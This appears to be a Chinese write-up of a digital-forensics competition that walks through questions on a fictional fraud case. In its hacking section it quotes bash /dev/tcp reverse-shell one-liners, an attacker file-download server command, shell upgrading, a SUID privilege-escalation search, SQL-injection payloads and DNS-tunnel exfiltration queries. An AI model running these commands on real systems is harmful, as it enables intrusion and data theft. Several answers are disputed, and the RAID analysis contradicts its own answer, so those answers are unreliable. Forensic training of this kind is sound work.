+这道题令人非常混乱. Ben 的电脑实机上有 Tor Browser, Kali 虚拟机里也有 Tor Browser...
+实机的 Tor Browser 火眼可以自动取证:
+书签夹名称为 Tor Project Bookmarks 的书签是 Tor Browser 自带的书签, 并非用户添加的书签. 用户添加的书签中有 4 个是 onion 链接.
+而对 kali linux 内的 Tor Browser 进行分析的时候, 火眼的 Chrome 内核浏览器解析一直卡在排队状态. 只好把虚拟机运行起来看看了.
+启动 Tor Browser 之后直接显示"第一次运行正在下载", 所以 Ben 实际上并没有在 Kali linux 内使用过 Tor Browser.
+62 在检查 Ben 的记录时, 发现了 Port 9151 的连接, 那是指 Ben 在使用什么浏览器?
+¶
+选项
+A. Chrome
+B. Tor
+C. Duckduckgo
+D. Edge
+答案
+B
+Tor Browser 会通过 9151 端口链接 Tor 网桥.
+其实根据上面一直在问的也能猜出来, 实在猜不出来的话仿真一下看看.
+64 Ben 使用
+OpenVPN 5.196.64.231
+多少天?
+¶
+选项
+A. 1
+B. 2
+C. 3
+D. 4
+答案
+B
+在快捷方式中可以看到 openvpn 的位置和 log 的位置
+/Windows/Users/Ben/Desktop/OpenVPN.log
+:
+第 1 次使用是在
+Aug 10, 2024
+:
+第 2 次使用是在
+Aug 16, 2024
+:
+65 他使用了哪种算法加密密码?
+¶
+答案
+AES-256-GCM
+在日志里搜索 cipher 可以看到:
+66 在 2024 年 8 月 16 日 17:40:06, 发生了什么?
+¶
+i) 无法在套接字(socket)上执行操作 
+ii) 系统缺乏足够的缓冲区空间 
+iii) 队列(queue)已满｡
+选项
+A. i & ii
+B. ii & iii
+C. i & iii
+D. 以上皆是
+按照日志的格式搜索
+Aug 16, 2024, 17:40:06
+, 可以看到一串报错:
+Text Only
+UDP send exception: send: An operation on a socket could not be performed because the system lacked sufficient buffer space or because a queue was full.
+UDP 发送异常: 发送: 无法执行 socket 操作, 由于系统缺少足够缓冲区或队列已满.
+所以这道题还是有点问题的, 报错原因不一定是同时发生了"系统缺少足够缓冲区"和"队列已满".
+69 参考
+Ben_Laptop.zip
+, 在 2024/08/23 14:54:59 UTC+8, Ben 浏览了哪个网站?
+¶
+答案
+https:\/\/teamviewer_internal\/
+可以在 Edge 浏览器的历史记录中找到记录:
+但是, 这并非一个正常的网站, 而是访问了 teamviewer 的本地服务.
+70 参考
+Ben_Laptop.zip
+, Ben 浏览上一题所述的网站时连接到他的计算机的 WiFi MAC 地址是?
+¶
+答案
+0A:68:D7:25:81:DD
+本题存疑.
+官方答案是
+0A:68:D7:25:81:DD
+在上题提及的时间中, 计算连接的 WiFi 可以从 Windows 日志中看到:
+但是并没有存储链接的 WiFi 的 Mac 地址.
+71 Ben 的计算机使用下列哪款远程桌面软件访问了 Ben 的跳转站?
+¶
+i: 向日葵远程控制 
+ii: AnyDesk 
+iii: TeamViewer
+选项
+A. i & iii
+B. ii & iii
+C. 只有iii
+D. 只有ii
+需要分别查看 3 个软件是否有连接记录.
+向日葵(Oray):
+连接历史日志为空.
+AnyDesk:
+全局搜索之后, 没有发现任何使用痕迹.
+TeamViewer:
+日志中有连接记录, 在跳板机中也能找到 TeamViewer 连接过的记录.
+Ben 的附加材料
+¶
+参考
+Ben_Attachments.zip
+及
+Ben_Laptop.zip
+.
+根据可能难以破解的加密, 你意识到 Ben 对黑客技术有深入的了解. 
+请回答以下问题, 以便了解 Ben 的运作
+~(?)
+~.
+流量包部分使用科来网络分析工具进行分析.
+49 Ben 想要有效地搜索信息, 他可以使用以下哪个 Google 高级搜索运算符来搜索某个特定网站?
+¶
+选项
+A. [related:]
+B. [inurl:]
+C. [site:]
+D. [info:]
+答案
+C
+常识题.
+50 参考
+材料1.pdf
+, Ben 试图入侵一个系统, 他尝试在系统中打开 HTTP 服务器. 使用 Python 内置的
+http.server
+模块启动基本 HTTP 服务器的命令是什么, 以便攻击者从目标机器下载文件?
+¶
+选项
+A. python3 -m http.server 9000
+B. python3 -a http.server 9000
+C. python3 -r http.server 9000
+D. python3 -m http.server 8000
+答案
+A
+常识题. 需要确定端口是 9000 还是 8000, 在 pdf 里面可以看到浏览器地址栏里是 9000 端口.
+51 参考
+材料2.pdf
+, Ben 准备了几个用于黑客攻击的脚本, 这段代码的攻击目的是什么?
+¶
+选项
+A. 拒绝服务
+B. 缓冲区溢出
+C. 建立反向 shell
+D. 勒索软件
+答案
+B
+填充 268 bytes 缓冲区溢出, 覆盖 SEH, 调 eax, 跳转到 shellcode.
+52 参考
+材料3.pdf
+, Ben 准备了几个用于黑客攻击的脚本, 他采用了什么技术来保护代码?
+¶
+选项
+A. 加密
+B. 代码混淆
+C. 隐写术
+D. 编译
+答案
+B
+weevely3: Weaponized web shell
+是一个 webshell 生成 & 链接工具. 为了免杀, 大多数 webshell 都要经过混淆.
+53 参考
+材料4.pdf
+, 他利用了什么方法来获取反弹 Shell?
+¶
+选项
+A. 中间人攻击
+B. 暴力破解
+C. 缓冲区溢出
+D. 文件上传
+答案
+D
+可以看到 weevely 连接时访问的地址位于 dvwa 的 uploads 目录, 应为上传的文件.
+54 参考
+1.pcap
+, Ben 使用了哪些命令来扫描目标机器?
+¶
+i) arp-scan -l 
+ii) nmap -p1 -65535 -sV -sC -O 
+iii) nmap -Sx 
+iv) nmap -sS
+选项
+A. i & ii
+B. ii & iii
+C. iii & iv
+D. 以上皆是
+发现了 TCP 端口扫描和 Arp 广播风暴:
+Arp 广播风暴:
+TCP 端口扫描:
+55 参考
+2.pcap
+, 第 56 号数据包的代码功能是什么?
+¶
+选项
+A. 清除记录
+B. 拒绝服务
+C. 测试注入漏洞
+D. 反弹 shell
+答案
+D
+命令放在 UA 里面.
+56 参考
+1.pcap
+, 当 Ben 成功进入目标系统时, 攻击者获取的账户是什么?
+¶
+答案
+root
+结合上面几道题目, Ben 入侵系统使用的是反弹 Shell, 流量中也有 NBSS 流量, 反弹 shell 的流量就在其中:
+翻看一下, 发现执行了 whoami 命令, 返回了 root.
+57 Ben 正在尝试入侵一个系统, 并且他正在进行开源研究. 他发现
+nc -vp 9000
+将被用来接到反弹 Shell. Ben 将使用什么命令来创建反弹 Shell?
+¶
+选项
+A.
+0<&196;exec 196<>/dev/tcp/10.10.10.10/9000;sh <&196 >&196 2>&196
+B.
+exec 5<>/dev/tcp/10.10.10.10/9000;cat <&5 | while read line; do $line 2>&5 >&5; done
+C.
+/bin/bash -i >& /dev/tcp/192.168.217.139/4444 0>&1
+D.
+sh -i 5<> /dev/tcp/10.10.10.10/9000 0<&5 1>&5 2>&5
+答案
+C
+参考第 55 题.
+58 参考
+材料5.pdf
+, Ben 输入了
+find / -perm -4000 2>/dev/null
+后, 显示了
+材料5.pdf
+的内容. 这些内容所显示的文件除具有执行权限, 还设置了什么?
+¶
+答案
+SUID
+大概也算是常识题了. 权限常用的是 3 位 8 进制数字, 从左到右分别是 R W X. 当文件被设置 SUID 权限时, 其权限的第 4 位(从右往左数)会被设置为 4.
+设置了 SUID 的文件允许以其拥有者的权限执行, 例如通过 su 获取 root 权限.
+SUID 算是渗透测试的常客了, 不少提权都是靠 SUID 的.
+59 Ben 发现了下面的命令
+import pty; pty.spawn("/bin/bash")
+, 它的功能是?
+¶
+选项
+A. 在 shell 中导入 Python 函数
+B. 允许 shell 执行 Python 命令
+C. 获取比 www-data 用户更高权限的交互式 shell
+D. 以上皆不是
+答案
+C
+常识题.
+python 的 pty 的权限至少是 user, 在某些权限管理不当的服务器上甚至可以拿到 root 权限.
+63 参考
+材料6.pdf
+, 是否应该保持默认设置, 以便 Firefox 浏览器使用 Tor 网络?
+¶
+答案
+否
+Firefox 浏览器使用 Tor 网络时需要为浏览器安装 Tor 插件, 并在计算机上配置 Tor 服务(Tor.exe).
+Ben 的 U 盘和 SD 卡
+¶
+调查员把一只属于 Ben 的 U 盘和一张 SD 卡交给了你进行分析.
+粤语里面的"咭(粤音: kat1, 标准汉语拼音: ji1)"就是取 card 的音, 意为"卡". 所以经常能在美亚杯的赛题里面看到类似"SD 咭", "显示咭"或者"网络咭"之类的说法.
+我就说得学粤语吧
+67 参考
+Ben_USB.e01
+, 是什么导致了"满汉全席.jpg"和"满汉全席Secret.jpg"之间的大小差异?
+¶
+选项
+A. 档案嵌入其中
+B. 像素差异
+C. MAC 时间更改
+D. 错误的档扩展名
+答案
+A
+对比一下文件, 明显是隐写了一个 office 文档:
+不知道具体是哪种文档, 直接解压开来看, 看起来是 word 文档:
+用 word 打开看看:
+是个 BitLocker 的恢复密钥, 最后还添加了一行密码.
+68 参考
+Ben_SDCard.e01
+, Ben 的 SD 卡的解密密码是?
+¶
+答案
+IamRich123!
+SD 卡是用 BitLocker To Go 加密的, 可以在 UFS 中挂载并进行解密:
+用上题中 word 文档中的密码成功解密. SD 卡中有 2 个 csv 文件:
+Ben 的跳转站
+¶
+参考
+Ben_Laptop.zip
+和
+Ben_Jumpstation.zip
+.
+72 Ben 的跳转站 IP 地址和子网掩码是什么?
+¶
+答案
+192.168.182.128/24
+73 在 Ben 的跳转站上, 该远程桌面软件(TeamViewer)中的访问 ID 是什么?
+¶
+答案
+687062512
+我在做到 TeamViewer 的时候, 总觉得似乎有点熟悉, 好像之前做别的题的时候见过. 于是回去翻了翻, 发现在 Alice 的手机的 WhatsApp 的群组聊天里也提到了 TeamViewer, John 在群里发送了 TeamViewer 的 Session ID 和 Password:
+74 Alice 何时从跳转站下载了文件?
+¶
+答案
+2024/08/23 18:31:55
+TeamViewer 的日志文件位于
+/Users/ben/AppData/Local/TeamViewer/Logs/TeamViewer15_Logfile.log
+和
+/Program Files/TeamViewer/TeamViewer15_Logfile.log
+前者是 TeamViewer 的安装和组件加载日志, 后者则是远程连接日志.
+首先可以看到 Alice 连接时的日志:
+随后看到发送文件的日志:
+得到 Alice 下载文件的时间为
+2024/08/23 02:31:55.410
+, 然后就是这道题的陷阱了. 我在做的时候也理所当然地觉得这个时间应该是 UTC+08 的时间, 还想着出题人还挺辛苦, 这么晚还在出题. 后来一想, 时间应该是可以自己调的, 顺手去翻了一下系统时间修改记录, 结果就看到了意料之外的情况:
+这台电脑的时间曾在 2024-08-23 的时候修改过, 修改过之后的时间是
+2024-08-22 14:53:17
+, 正好就在 TeamViewer 连接的时间之前.
+然后又去看了一眼时区:
+电脑的时区是 UTC-08. 所以这道题的正确答案应该是日志中的 UTC-08 时间转换到 UTC+08 时间, 为
+2024/08/23 18:31:55
+.
+75 有多少个访问 ID 连接过跳转站?
+¶
+答案
+2
+Web 题
+¶
+我愿称这部分题目为 CISCN 初赛知识问答题目.
+这部分都算常识题吧, Web + 计网.
+76 您正在检查来自 Web 应用程序防火墙的 HTTP 流量日志, 并注意到以下日志条目
+¶
+Text Only
+[2023-10-15 11:45:12] "GET /search?q=%27%3B+SHUTDOWN+-- HTTP/1.1" 500
+[2023-10-15 11:45:15] "GET /search?q=%27+UNION+SELECT+password+FROM+users+-- HTTP/1.1" 200
+[2023-10-15 11:45:18] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200
+根据这些日志条目, 下列哪项陈述正确识别了攻击的类型和目标组件? 
+i. 正在尝试 SQL 注入攻击.
+ii. 攻击者瞄准的是 Web 应用程序的数据库.
+iii. 正在执行跨站点脚本(XSS)攻击.
+iv. 正在瞄准 Web 服务器的操作系统.
+选项
+A. i & ii
+B. ii & iii
+C. i & iv
+D. iii & iv
+明显正在 search 参数进行 sql 注入.
+77 在对网络日志进行取证分析时, 您发现内部主机向可疑网域发出了不寻常的 DNS 查询
+¶
+D
+Timestamp
+:
+2024
+-
+09
+-
+23
+12
+:
+00
+:
+00
+Query
+:
+dGhpc3Bj
+.
+susdomain
+.
+com
+Type
+:
+TXT
+Timestamp
+:
+2024
+-
+09
+-
+23
+12
+:
+05
+:
+00
+Query
+:
+cGFzc3dvcmRpcw
+==.
+susdomain
+.
+com
+Type
+:
+TXT
+Timestamp
+:
+2024
+-
+09
+-
+23
+12
+:
+10
+:
+00
+Query
+:
+TWVpeWEyMDl0
+.
+susdomain
+.
+com
+Type
+:
+TXT
+结果显示包含大量 Base64 编码数据, 攻击者使用了什么技术?
+选项
+A. 域生成算法 (DGA)用于 C2 通信
+B. 快速通量 DNS 用于隐藏恶意服务器
+C. DNS 缓存投毒用于复位向流量
+D. DNS 隧道用于数据泄露
+一眼 DNS 隧道通信.
+base64 解一下是
+thispc
+,
+passwordis
+,
+Meiya209t
+.
+78 在检查内部客户端和外部服务器之间的捕获包, 您注意到以下 Transport Layer Security 握手消息
+¶
+Text Only
+Client Hello: Supported Versions: TLS 1.0, TLS 1.1, TLS 1.2
+Cipher Suites: TLS_RSA_WITH_3DES_EDE_CBC_SHA, TLS_RSA_WITH_RC4_128_SHA
+Server Hello: Selected Version: TLS 1.0
+Cipher Suite: TLS_RSA_WITH_RC4_128_SHA
+鉴于客户端和服务器均支持更高版本的 TLS 和更强的加密套件, 下列哪些是降级的合理解释? 
+i. 中间人攻击导致协议降级.
+ii. 错误配置导致回退到较弱的加密方式.
+iii. 由于客户端与服务器的兼容性问题, 属于正常操作.
+选项
+A. i & ii
+B. 只有 ii
+C. 只有 i
+D. 以上皆是
+不是, 你这个 D 选项我咋看不懂了? iii 根本不选的吗?
+79 参考以下 HTTP 访问日志片段
+¶
+nginx log
+192.168.1.1 -- [12/Oct/2023:14:55:36 +0000] "GET /index.html HTTP/1.1" 200 1024  
+192.168.1.15 -- [12/Oct/2023:14:56:10 +0000] "POST /login.php HTTP/1.1" 200 512  
+192.168.1.10 -- [12/Oct/2023:14:57:01 +0000] "GET /admin/dashboard.php HTTP/1.1" 403 256  
+192.168.1.20 -- [12/Oct/2023:14:58:25 +0000] "GET /index.html HTTP/1.1" 200 1024
+哪个IP地址试图访问受限页面?
+选项
+A. 192.168.1.15
+B. 192.168.1.10
+C. 192.168.1.20
+D. 192.168.1.1
+403 Forbidden.
+80 参考以下网络数据包捕获的十六进制部分
+¶
+00 00 00 1a a0 b0 c0 d0 00 1b c1 d1 e1 f1 08 00 45 00 00 10 00 3c 1c 46 40 00 40 06 a6 ec c0 a8 01 0a c0 a8 00 20 01 14 00 50 d1 5c 1a 2b 3c 4d 5e 6f 70 80 90 a0 0030 b0 c0 d0 e0 f0 00 00 00 00 50 02 20 00 b5 e2 00
+数据包的源 IP 地址是什么?
+192.168.1.10
+考研刚学完计网, 直接秒了.
+45 00
+是 IP 报文的 version, Head Length 和 TOS, 隔 11 Bytes 后是 src_ip:
+c0 a8 01 0a
+, 转换成 10 进制:
+192.168.1.10
+.
+81 参考以下 Wireshark 捕获摘要
+¶
+No.
+Time
+Source
+Destination
+Protocol
+Length
+Info
+1
+0.000000
+192.168.1.10
+192.168.1.255
+ARP
+42
+Who has 192.168.1.255?  Tell 192.168.1.10
+2
+0.005000
+192.168.1.20
+192.168.1.10
+ICMP
+98
+Echo (ping) request
+3
+0.010000
+192.168.1.10
+192.168.1.20
+ICMP
+98
+Echo (ping) reply
+4
+0.020000
+192.168.1.30
+192.168.1.10
+TCP
+66
+12345 > 80 [SYN] Seq=0 Win=64240 MSS=1460
+5
+0.025000
+192.168.1.10
+192.168.1.30
+TCP
+66
+80 > 12345 [SYN, ACK] Seq=0 Ack=1 Win=64240 MSS=1460 18: 1-09
+6
+0.030000
+192.168.1.30
+192.168.1.10
+TCP
+54
+12345 > 80 [ACK] Seq=1 Ack=1 Win=64240
+描述此捕获中发生的事件顺序.
+选项
+A. Ping 请求后发送 ARP 请求
+B. ARP 请求, Ping 交换和 TCP 握手
+C. TCP 握手后发送 ARP 请求
+D. 仅存在 ICMP 流量
+真白给. 看协议就行.
+82 参考服务器上 netstat 命令的以下输出
+¶
+Active Internet connections (servers and established) 
+Proto Recv-Q Send-Q Local Address Foreign Address State 
+tcp 0 0 0.0.0.0:22 0.0.0.0: LISTEN
+tcp 0 0 192.168.1.10:22 203.0.113.20:54321 ESTABLISHED 
+tcp 0 0 192.168.1.10:80 198.51.100.5:12345 ESTABLISHED 
+tcp 0 0 192.168.1.10:443 203.0.113.25:23456 ESTABLISHED 
+哪些服务当前正在服务器上运行并监听?
+选项
+A. 在 80 端口上的 SSH 和 54321 端口上的 HTTP
+B. 仅在 22 端口上的 SSH
+C. 在 22 端口上的 SSH, 12345 端口上的 HTTP 以及 443 端口上的 HTTPS
+D. 仅在 23456 端口上的 HTTPS
+83 参考以下电子邮件头信息识别可能表明电子邮件被伪造的任何异常
+¶
+From: "John Doe" john.doe\@example.com 
+To: "Jane Smith" jane.smith\@company.com 
+Date: Thu, 12 Oct 2023 19:00:00 +0000 
+Subject: Important Update 
+Received: from unknown (HELO mail.example.com) (192.0.2.10) 
+by mail.company.com with SMTP; Thu, 12 Oct 2023 19:00:05 +0000 
+X-Mailer: PHPMailer 5.2
+选项
+A. 使用了PHPMailer 5.2
+B. 电子邮件头部显示未知发件人
+C. 电子邮件在19:00:00发送,但在19:00:05接收
+D. 主题是"重要更新"
+Received 字段未标明发件人.
+84 在网络取证中, 您会检查 TCP/IP 数据包中的哪个字段来验证数据在传输过程中是否受到了破坏?
+¶
+选项
+A. TCP序列号
+B. 数据包大小
+C. 校验和(Checksum)
+D. 目标端口
+答案
+C
+85 以下哪个特征最能表明僵尸网络中的指挥与控制(C2)通信?
+¶
+选项
+A. 高频率的DNS查询到热门域名
+B. 数据包传至255.255.255.255
+C. 与远程服务器进行定期周期性通信
+D. 使用FTP协议进行过多的文件传输请求
+答案
+C
+86 在 IP 封包分析中，哪一个数值最能够协助推断封包经过的距离?
+¶
+选项
+A. 由于路由无响应导致的数据包丢失增加
+B. IP 封包中的 TTL 值
+C. ICMP 回显回复中不匹配的序列号
+D. 路由器级别检查 IP 选项字段的异常
+答案
+B
+Alice 的笔记本电脑
+¶
+通过从跳转站(Ben_Jumpstation.zip)获得的信息, 你认为 Alice 的笔记本电脑可能包含与犯罪相关的更多信息.
+你建议调查员进一步扣押Alice的笔记本电脑进行分析.
+参考
+Alice_Macbook.e01
+.
+87 计算机名称是?
+¶
+选项
+A. Alice's MacBook Pro
+B. Alice's Laptop
+C. Alice's Mac
+D. Alice's MacBook
+答案
+A
+88 Alice 的计算机运行的 MacOS Monterey 版本是？
+¶
+答案
+12.7.5
+可以看到硬盘中存在几个卷:
+其中
+OS X Base System
+存放系统文件,
+OS X Base System - Data
+是 MacOS 的用户根目录,
+preboot
+用于存放与 MacOS 系统引导相关的文件,
+update
+是与更新相关的文件.
+在
+update
+文件夹的
+update.plist
+中可以看到更新前系统版本号为
+12.7.5
+, 更新后版本号为
+12.7.6
+, 并且更新前启动的系统 build 号为
+21H122
+也就是
+12.7.5
+:
+在
+/OS X Base System/System/Library/CoreServices/SystemVersion.plist
+中有 1 项关于系统版本的记录:
+在
+/Preboot/62F2D65C-F82D-3FCC-BDFB-217C83EC96C9/System/Library/CoreServices/SystemVersion.plist
+中也有 1 项关于系统版本的记录:
+但是按照常理来说,
+preboot
+卷与
+OS X Base System
+卷中的信息应当保持一致才对, 火眼自动分析采用的是
+/OS X Base System/System/Library/CoreServices/SystemVersion.plist
+中的系统版本号, 也就是
+12.7.6
+:
+但是系统安装中并没有升级到
+12.7.6
+的历史记录:
+仿真之后也可以看到系统版本号是
+12.7.5
+:
+打个快照, 尝试联网之后发现系统已经准备好了
+12.7.6
+版本的更新但尚未应用更新. 到这里, 其实已经比较明确是怎么回事了.
+更新之后的
+preboot
+卷中的系统版本信息:
+preboot
+卷的作用类似于引导 MacOS 的启动, 会与
+OS X Base System
+卷共同组成系统启动时使用的虚拟卷, 而
+preboot
+卷中的文件将覆盖
+OS X Base System
+中的同名文件.
+89 Alice 的计算机的 EN0 MAC 地址是？
+¶
+答案
+F4-5C-89-A1-C0-07
+90 Alice 在 2024 年 8 月 19 日收到了一个包含 15 个人个人资料的 Excel 文件, 她是从哪一个平台下载的?
+¶
+答案
+WhatsApp
+还是之前那个 WhatsApp 群组里发送的 Excel 文件, 在电脑的 Downloads 目录里:
+另外, Downloads 目录里还有 WhatsApp 的程序镜像. 可以看到 Alice 的电脑上安装了 WhatsApp, 其数据库存储在
+OS X Base System - Data/Users/alice_c/Library/Group Containers/group.net.whatsapp.WhatsApp.shared
+目录下.
+在
+ZWAMEDIAITEM
+表里找到文件记录:
+根据
+ZMEDIALOCALPATH
+中记录的文件存储位置可以找到 WhatsApp 自动接收的文件:
+91 承上题, Alice 何时在她的 Mac 上安装了上述应用程序?
+¶
+答案
+2024-08-19 10:03
+本题存疑.
+官方给的答案是
+2024-08-19 10:03
+.
+由于应用程序的来源不是 AppStore, 因此 MacOS 的软件安装记录里面没有关于 WhatsApp 的记录.
+只能根据 WhatsApp 的应用文件存储目录的创建时间来大致判断:
+可以看到创建时间为
+2024-08-15 07:27:20
+与官方给出的时间相差较大.
+92 Alice 在 2024 年 8 月 19 日截取了两张关于电骗中心位置的屏幕截图, 她使用哪个浏览器搜索该位置?
+¶
+答案
+Safari
+2 张图片就在桌面上:
+可以看到图片上标注的地点是 Tai Sang Wei(大生围). 在 Safari 的历史记录中可以看到 google 地图中浏览这个位置:
+93 她的计算机的 TeamViewer Client ID 是多少?
+¶
+答案
+358639376
+94 Alice 通过哪种方式登录 TeamViewer 获取包含个人数据的 Excel 文件？
+¶
+选项
+A. Teamviewer Desktop Application
+B. web.teamviewer.com
+C. Anydesk
+D. 以上皆不是
+答案
+B
+可以看到 Alice 在 Chrome 浏览器中通过网页端的 TeamViewer 连接了机器 id 为 687062512 的设备, 这个 id 是 Ben 的跳转站, 见第 73 题:
+或者仿真之后查看文件的 xattr:
+95 承上题, 该 Excel 文件的文件名是?
+¶
+选项
+A. newfile.xlsx
+B. personal_data.xlsx
+C. Personal_details_2.xlsx
+D. Kingsoft_Et_Stocka.xlsx
+答案
+C
+见上题.
+96 承上题, Alice 何时通过 TeamViewer 获取该文件?
+¶
+答案
+2024-08-23 17:31:53
+根据文件的创建时间判断.
+97 Alice 连接的另一台计算机的 TeamViewer ID 是多少?
+¶
+答案
+687062512
+见第 94 题.
+John 的电脑
+¶
+同样, 跳转站(Ben_Jumpstation.zip)也指向一些可能从 John 的桌面计算机获取的关键信息.
+参考
+John_Desktop.e01
+.
+98 系统最后关机时间是?
+¶
+答案
+2024-08-20 17:40:05
+99 系统连接
+USB SanDisk 3.2Gen 1
+, 其序列号是?
+¶
+选项
+A. 01010de54f417fee2292cb6b6ed760608009cace6e76a
+B. D9644B9861A106C9DB4FD4599863C856C6789384B
+C. 4f7b6f8fc20f74329994f7d3fac6920a8d0ecd33fabad423
+D. 8fe24bf440f2def1c5182e1a27a4c183f5d6024b758c803
+答案
+A
+100 于 2024 年 8 月 28 日 13 时 57 分 21,  John 曾连接过 Meta Quest 3 吗?
+¶
+答案
+是
+连接时间是
+2024-08-28 13:57:06
+, 弹出时间是
+2024-08-28 14:15:12
+. 题目中给的时间是连接着的.
+101 John 在何时打开了
+Joshe investment.JPG
+文件?
+¶
+答案
+2024-08-01 16:57:09
+本题存疑.
+官方给出的答案是
+2024-08-01 16:57:09
+.
+在最近访问的项目中看到访问时间是
+2024-08-01 16:13:08
+:
+102 用户"DESKTOP-HDKJIJJ"的安全标识符(SID)是?
+¶
+答案
+S-1-5-21-938709476-2694722248-4044499888
+这道题描述是有点问题的, 应该是想问计算机 Local 域的 SID 是什么. 本地用户的 SID 去掉最后一段标记用户的就是 Local 域的 SID 了:
+103 该计算机中被停用的用户账户数量是?
+¶
+本题存疑, 官方答案是:
+选项
+A. 1
+B. 2
+C. 3
+D. 5
+可以看到用户有 4 个账户的状态是无效的(停用). 仿真起来在计算机管理中看到的也是这 4 个用户被停用.
+104 该计算机通过 DHCP 获取的 IP 地址是?
+¶
+答案
+172.20.10.2
+105 视频文件"DF_2024_08_29_10_01_27_906.mp4"的内容类型是?
+¶
+选项
+A. 自我介绍
+B. 产品销售
+C. 深伪(DeepFake)视频
+D. 足球比赛
+答案
+C
+一眼换脸视频.
+顺便推荐一个目前还能免费使用的 deepfake 检测平台:
+Deepware| Deepware.Ai | Scan & Detect Deepfake Videos
+John 的 Meta Quest 3
+¶
+在搜查 John 住所期间, 调查员检取了一副虚拟现实(VR)眼鏡进行了取证检查.
+参考
+Quest_3_2G0YC5ZFB307D7.zip
+.
+目前市面上流行的消费级 VR 设备共有 3 类:
+Android 系统 VR 设备: Meta Quest 系列(旧称 Oculus Quest), HTC Vive 系列, 国产的 VR 设备等;
+visionOS 设备: 仅限 Apple 公司的 Apple Vision Pro.
+Linux 设备: 开源 VR 设备, Valve Index VR 等.
+本题中的 Meta Quest 3 使用的是 Android 操作系统, 但只提取了部分备份文件, 并未提取完整镜像, 需要人工解析.
+106 VR 眼镜的使用者数量是?
+¶
+选项
+A. 1
+B. 2
+C. 3
+D. 4
+答案
+A
+在
+/Quest_3_2G0YC5ZFB307D7/profile/list_users.txt
+中可以看到只有一个用户
+John Killer
+.
+107 VR 眼镜预装的即时通讯软件是?
+¶
+选项
+A. WeChat
+B. LINE
+C. WhatsApp
+D. Telegram
+答案
+C
+在
+Quest_3_2G0YC5ZFB307D7/profile/list_packages.txt
+中可以看到安装有 WhatsApp.
+108 应用程序"Gun Raiders"的版本号是?
+¶
+答案
+10.6.5
+在
+Quest_3_2G0YC5ZFB307D7/profile/dumpstar.txt
+中可以搜索到关于
+gunraiders
+的信息:
+109 应用程序"Gun Raiders"是否具有启动设备发现或操纵蓝牙的功能?
+¶
+答案
+是
+接上题. 权限包含
+android.permission.BLUETOOTH_ADMIN
+和
+android.permission.BLUETOOTH_CONNECT
+.
+110 DCIM 文件夹中 2024 年 8 月 13 日修改的视频文件数量是?
+¶
+答案
+3
+在 DCIM 目录下将文件全显打开, 筛选时间段:
+111 参考
+Quest3_2G0VC5ZFB307D7.zip
+, VR 眼镜"wlan0"网络接口的 IPv4 地址是?
+¶
+答案
+192.168.1.142
+在
+Quest_3_2G0YC5ZFB307D7/profile/ifconfig.txt
+中:
+John 的 NAS
+¶
+除了以上 John 的所有设备之外, 调查员还发现了一台 NAS 存储设备, 并转交你进行分析. 
+参考
+John_NAS_1.E01
+和
+John_NAS_2.E01
+.
+只有 2 个镜像, 只能是 Raid0 或 Raid1. 放进 UFS 里面看一下, 发现是 Raid0. 对于 Raid1 需要重组之后进行分析.
+重组之后可以看到, 整个 RAID 共有 4 个分区, 分别是
+SWAP
+分区, 卷标为
+1.44.1-69057
+的 EXT 分区和 1 个 vg 容器, 其中包含 2 个分区, 分别是保留分区和数据分区.
+卷标为
+1.44.1-69057
+的 EXT 分区保存有 NAS 的系统和管理程序, vg 容器中的数据分区则是 NAS 的数据存储分区.
+另外, 可以在 NAS 的数据目录中看到很多
+@
+开头的文件. 这些文件是 NAS 管理程序设定的隐藏文件夹, 与
+*nix
+系统中以
+.
+开头的文件类似.
+112 该 NAS 设备使用的 RAID 类型是?
+¶
+选项
+A. RAID 0
+B. RAID 1
+C. RAID 5
+D. 以上皆不是
+答案
+B
+见上述分析.
+113 该 NAS 的总存储容量是否为 512 GB?
+¶
+答案
+否
+导出镜像之后用 XWF 加载可以看到分区信息:
+总存储容量为 426 GB.
+114 该 NAS 的可用存储空间是?
+¶
+选项
+A. 512 GB
+B. 426 GB
+C. 417 GB
+D. 9.4 GB
+答案
+C
+见上题. 可用空间为 417 GB.
+115 该 NAS 的文件系统格式是否为 EXT3?
+¶
+答案
+否
+在 XWF 的技术细节报告中可以看到文件系统格式为 EXT4.
+116 该 NAS 上的用户账户数量是?
+¶
+选项
+A. 1
+B. 2
+C. 3
+D. 4
+答案
+B
+需要分析系统分区.
+在
+/etc/synouser.conf
+中记录了 NAS 的用户名:
+在 NAS 的数据分区中也可以看到这 2 个用户的配置文件:
+117 标记为"儿童色情照片(This is a Child PORN PHOTO)"的图片数量是?
+¶
+答案
+5
+在数据分区里:
+火眼的图片文字提取功能可以提取出来:
+118 视频文件"ING_VID_8081695_10s.mp4"被存入 NAS 的具体时间是?
+¶
+答案
+2024-08-08 10:59:40
+可以直接查看文件的修改时间是
+08.08.2024 10:59:40
+:
+119 视频文件"dcdb711a52a94fe9b6eb742a6919410D.mp4"的下载来源网站是?
+¶
+答案
+mp4.vjshi.com
+本题存疑. 官方给出的答案是
+www.aliyun.com
+@eaDir
+文件夹是由 Synology(群晖) 的文件服务自动生成的隐藏文件夹, 用于存储与媒体文件相关的元数据等. 可以看到视频文件的元数据:
+至于官方答案给出的阿里云的网址, 则是在视频元数据的编码器中找到的:
+120 参考
+John_Desktop.E01
+, John 访问 NAS 时使用的网络地址是?
+¶
+答案
+169.254.43.127
+John 的电脑的 IP 地址.
+121 参考
+John_Desktop.E01
+, NAS 网络驱动器的盘符是?
+¶
+选项
+A. A
+B. C
+C. Z
+D. F
+答案
+C
+在最近访问的项目中可以看到:
+在网络位置中也可以看到:
+122 参考
+John_Desktop.E01
+,
+John_NAS_1.E01
+和
+John_NAS_2.E01
+, "v"文件夹中的视频和照片数量是否相同?
+¶
+答案
+是
+本题存疑. 官方给出的答案是
+否
+.
+John 的电脑:
+v
+文件夹内有 50 个视频文件.
+NAS 中:
+v
+文件夹内也有 50 个视频文件:
+甚至我在对 2 个盘分别进行了签名恢复和 iNode 恢复之后都没有找到其他的视频文件.
+123 "a"文件夹中"1.jpeg"文件的来源网站是?
+¶
+答案
+poe.com
+还是查看
+@eaDir
+中保存的元数据:
+124 该 NAS 的 c 文件夹中被删除的照片文件名是?
+¶
+答案
+203533-17158629334c7d.jpg
+火眼中可以看到被删除的文件:
+XWF 也可以检测到:
+Alice 的手机 - 二周目
+¶
+根据你以上的发现, 你直觉认为有无辜的人被雇为所谓的客服人员, 他们的安全仍然存在疑虑. 
+你决定再次查看 Alice 的手机镜像以确认你的推测.
+参考
+Alice_Mobile.bin
+.
+125 Alice 于 2024 年 8 月 16 日通过"Foodpanda"点餐的餐厅全称是?
+¶
+答案
